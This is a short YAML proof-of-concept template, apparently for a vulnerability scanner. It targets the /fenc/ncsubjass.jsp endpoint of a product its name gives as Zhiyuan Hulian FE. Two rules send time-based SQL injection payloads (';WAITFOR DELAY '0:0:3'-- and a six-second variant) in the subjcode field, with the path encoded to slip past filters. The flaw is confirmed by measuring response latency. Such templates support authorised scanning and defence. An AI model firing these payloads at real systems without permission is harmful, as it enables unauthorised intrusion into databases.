name: poc-yaml-zhiyuanhulianFE-ncsubjass-sql-injection
transport: http


rules:
  r0:
    request:
      method: POST
      path: /fenc/ncsubjass.j%73p
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: subjcode=';WAITFOR DELAY '0:0:3'--
    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
  r1:
    request:
      method: POST
      path: /fenc/ncsubjass.j%73p
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: subjcode=';WAITFOR DELAY '0:0:6'--
    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
expression: r0() && r1()

